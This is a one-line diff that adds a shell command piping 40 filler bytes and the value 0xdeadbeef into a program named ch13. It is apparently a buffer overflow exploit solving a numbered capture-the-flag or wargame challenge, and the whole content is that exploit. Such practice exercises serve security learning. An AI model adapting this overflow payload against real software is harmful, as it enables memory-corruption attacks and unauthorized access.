@@ -1,0 +1,1 @@
+(python -c "print 'A'*40+'\xef\xbe\xad\xde'";cat) | ./ch13
